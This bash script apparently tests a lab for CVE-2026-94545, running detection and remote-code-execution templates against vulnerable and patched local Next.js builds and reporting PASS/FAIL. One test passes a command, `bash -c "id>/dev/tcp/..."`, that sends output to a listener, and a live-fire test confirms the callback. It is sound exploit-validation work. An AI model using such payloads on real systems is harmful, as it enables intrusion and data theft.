#!/usr/bin/env bash
# Run both templates against both lab builds and report PASS/FAIL per check.
#
#   ./run-tests.sh              full run (the vulnerable target is killed by the
#                               exploit test and restarted at the end)
#   ./run-tests.sh --no-rce     skip the destructive exploit test
#
# Requires the lab to be up: ./setup.sh && ./start.sh
set -uo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SHIM="$LAB_DIR/tools/nuclei-shim.mjs"
DETECT="$LAB_DIR/../CVE-2026-94545.yaml"
RCE="$LAB_DIR/../CVE-2026-94545-rce.yaml"
OOB_LOG="$LAB_DIR/oob-hits.log"
VULN_PORT="${VULN_PORT:-3000}"
PATCHED_PORT="${PATCHED_PORT:-3001}"
OOB_PORT="${OOB_PORT:-4444}"
RUN_RCE=1

[ "${1:-}" = "--no-rce" ] && RUN_RCE=0

PASS=0
FAIL=0
declare -a FAILURES

c_red=$'\033[1;31m'; c_green=$'\033[1;32m'; c_blue=$'\033[1;34m'; c_dim=$'\033[2m'; c_off=$'\033[0m'

section() { printf '\n%s=== %s ===%s\n' "$c_blue" "$*" "$c_off"; }
info()    { printf '%s    %s%s\n' "$c_dim" "$*" "$c_off"; }

check() { # description, expected, actual
  if [ "$2" = "$3" ]; then
    PASS=$((PASS + 1))
    printf '  %sPASS%s %s  %s(%s)%s\n' "$c_green" "$c_off" "$1" "$c_dim" "$3" "$c_off"
  else
    FAIL=$((FAIL + 1))
    FAILURES+=("$1: expected '$2', got '$3'")
    printf '  %sFAIL%s %s  expected %s, got %s\n' "$c_red" "$c_off" "$1" "$2" "$3"
  fi
}

check_true() { # description, condition-result(0/1), detail
  if [ "$2" -eq 0 ]; then
    PASS=$((PASS + 1))
    printf '  %sPASS%s %s  %s(%s)%s\n' "$c_green" "$c_off" "$1" "$c_dim" "${3:-}" "$c_off"
  else
    FAIL=$((FAIL + 1))
    FAILURES+=("$1: ${3:-failed}")
    printf '  %sFAIL%s %s  %s\n' "$c_red" "$c_off" "$1" "${3:-}"
  fi
}

app_alive() { # port
  curl -fsS -m 5 -o /dev/null "http://127.0.0.1:$1/api/lab-info" 2>/dev/null
}

lab_info() { # port, key
  curl -fsS -m 5 "http://127.0.0.1:$1/api/lab-info" 2>/dev/null |
    python3 -c "import json,sys; print(json.load(sys.stdin).get(sys.argv[1], ''))" "$2" 2>/dev/null
}

oob_lines() {
  if [ -f "$OOB_LOG" ]; then
    grep -c . "$OOB_LOG" 2>/dev/null || true   # grep exits 1 on an empty file
  else
    echo 0
  fi
}

# --------------------------------------------------------------------- preflight
section "preflight"
if ! app_alive "$VULN_PORT"; then
  printf '%sThe vulnerable build is not answering on :%s. Run ./setup.sh && ./start.sh first.%s\n' "$c_red" "$VULN_PORT" "$c_off"
  exit 1
fi
if ! app_alive "$PATCHED_PORT"; then
  printf '%sThe patched build is not answering on :%s - run ./start.sh first.%s\n' "$c_red" "$PATCHED_PORT" "$c_off"
  exit 1
fi
check "vulnerable build reachable" "200" "$(curl -s -o /dev/null -w '%{http_code}' -m 5 "http://127.0.0.1:$VULN_PORT/api/lab-info")"
check "patched build reachable" "200" "$(curl -s -o /dev/null -w '%{http_code}' -m 5 "http://127.0.0.1:$PATCHED_PORT/api/lab-info")"

# ------------------------------------------------------------------ stack shapes
section "target stack (the product versions that decide exploitability)"
v_next="$(lab_info "$VULN_PORT" next)"
v_escape="$(lab_info "$VULN_PORT" escaping)"
v_node="$(lab_info "$VULN_PORT" node)"
v_xml="$(lab_info "$VULN_PORT" libxml2)"
v_rsvg="$(lab_info "$VULN_PORT" librsvg)"
p_next="$(lab_info "$PATCHED_PORT" next)"
p_escape="$(lab_info "$PATCHED_PORT" escaping)"

check "vulnerable target runs Next.js 16.3.5" "16.3.5" "$v_next"
check "vulnerable target serializes text un-escaped" "un-escaped (vulnerable)" "$v_escape"
check "patched target runs Next.js 16.3.6" "16.3.6" "$p_next"
check "patched target escapes text" "html-escaped (patched)" "$p_escape"
check "native libxml2 is the advisory version" "2.15.3" "$v_xml"
check "native librsvg is the advisory version" "2.62.91" "$v_rsvg"
check "node is the non-PIE build the gadgets target" "v24.20.0" "$v_node"

# ------------------------------------------------------------ detection template
section "CVE-2026-94545.yaml (detection, non-destructive)"
info "target 127.0.0.1:$VULN_PORT - vulnerable"
detect_vuln="$(node "$SHIM" "$DETECT" "127.0.0.1:$VULN_PORT" --print-response --quiet 2>&1)"
detect_vuln_rc=$?
info "$(printf '%s' "$detect_vuln" | grep -o 'NEXTJS_OG_XINCLUDE_REACHABLE.*' || true)"
check "detection matches the vulnerable build" "0" "$detect_vuln_rc"
check_true "report carries probe/control measurements" \
  "$(printf '%s' "$detect_vuln" | grep -qE 'probe=[0-9]+B control=[0-9]+B ratio=[0-9.]+' && echo 0 || echo 1)" \
  "$(printf '%s' "$detect_vuln" | grep -oE 'probe=[0-9]+B control=[0-9]+B ratio=[0-9.]+' || true)"

info "target 127.0.0.1:$PATCHED_PORT - patched"
detect_patched="$(node "$SHIM" "$DETECT" "127.0.0.1:$PATCHED_PORT" --print-response --quiet 2>&1)"
detect_patched_rc=$?
info "$(printf '%s' "$detect_patched" | tail -1)"
check "detection does not match the patched build" "3" "$detect_patched_rc"

info "target 127.0.0.1:$VULN_PORT with --var base=http://127.0.0.1:$VULN_PORT"
detect_override_rc=0
node "$SHIM" "$DETECT" "127.0.0.1:$VULN_PORT" --var "base=http://127.0.0.1:$VULN_PORT" --quiet >/dev/null 2>&1 || detect_override_rc=$?
check "explicit base override still matches" "0" "$detect_override_rc"

info "target 127.0.0.1:3999 - nothing listening"
node "$SHIM" "$DETECT" "127.0.0.1:3999" --quiet >/dev/null 2>&1
dead_rc=$?
check "closed port is reported as not matched, not as an error" "3" "$dead_rc"

# ---------------------------------------------------------------- exploit gates
section "CVE-2026-94545-rce.yaml (gate and refusals, non-destructive)"
info "patched target, safecheck default"
node "$SHIM" "$RCE" "127.0.0.1:$PATCHED_PORT" --quiet >/dev/null 2>&1
gate_rc=$?
check "pre-condition gate blocks the patched build" "3" "$gate_rc"
check_true "no payload was delivered (patched target still serving)" "$(app_alive "$PATCHED_PORT" && echo 0 || echo 1)"

info "vulnerable target, 72-byte command"
oversize_out="$(node "$SHIM" "$RCE" "127.0.0.1:$VULN_PORT" --var cmd=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA --quiet 2>&1)"
oversize_rc=$?
check "oversized command is refused" "1" "$oversize_rc"
check_true "refusal explains the 71-byte limit" \
  "$(printf '%s' "$oversize_out" | grep -q 'limit is 71' && echo 0 || echo 1)" \
  "$(printf '%s' "$oversize_out" | grep -o 'command is 72 bytes.*' | head -1)"

info "patched target, safecheck=false (payload delivered on purpose)"
oob_before="$(oob_lines)"
node "$SHIM" "$RCE" "127.0.0.1:$PATCHED_PORT" --var safecheck=false \
  --var "cmd=bash -c \"id>/dev/tcp/127.0.0.1/$OOB_PORT\"" --oob-log "$OOB_LOG" --quiet >/dev/null 2>&1
patched_rce_rc=$?
sleep 1
check_true "patched build survives the payload (no RCE)" "$(app_alive "$PATCHED_PORT" && echo 0 || echo 1)"
check "patched build produced no callback" "$oob_before" "$(oob_lines)"

# ------------------------------------------------------------------- live-fire
if [ "$RUN_RCE" = "1" ]; then
  section "CVE-2026-94545-rce.yaml (live fire against the vulnerable build)"
  oob_before="$(oob_lines)"
  info "target 127.0.0.1:$VULN_PORT, default callback -> 127.0.0.1:$OOB_PORT"
  rce_out="$(node "$SHIM" "$RCE" "127.0.0.1:$VULN_PORT" --var "oast=127.0.0.1:$OOB_PORT" \
    --oob-log "$OOB_LOG" --print-response --quiet 2>&1)"
  rce_rc=$?
  info "$(printf '%s' "$rce_out" | grep -o 'payload sent to.*' || true)"
  check "exploit matches the vulnerable build" "0" "$rce_rc"
  check "callback recorded by the OOB listener" "$((oob_before + 1))" "$(oob_lines)"
  check_true "callback carries the command output" \
    "$(tail -n 1 "$OOB_LOG" | grep -q 'uid=' && echo 0 || echo 1)" \
    "$(tail -n 1 "$OOB_LOG" 2>/dev/null | sed 's/.*data=//')"
  check_true "vulnerable worker was replaced (connection refused)" \
    "$(app_alive "$VULN_PORT" && echo 1 || echo 0)"

  section "restarting the vulnerable build"
  "$LAB_DIR/start.sh" --restart vulnerable >/dev/null 2>&1
  check_true "vulnerable build serves again" "$(app_alive "$VULN_PORT" && echo 0 || echo 1)"
  node "$SHIM" "$DETECT" "127.0.0.1:$VULN_PORT" --quiet >/dev/null 2>&1
  check "detection matches again after restart" "0" "$?"
else
  section "skipping the destructive exploit test (--no-rce)"
fi

# ----------------------------------------------------------------------- summary
section "summary"
printf '  %s%d passed%s, %s%d failed%s\n' "$c_green" "$PASS" "$c_off" \
  "$([ "$FAIL" -eq 0 ] && echo "$c_dim" || echo "$c_red")" "$FAIL" "$c_off"
for failure in "${FAILURES[@]:-}"; do
  [ -n "$failure" ] && printf '  - %s\n' "$failure"
done

[ "$FAIL" -eq 0 ]
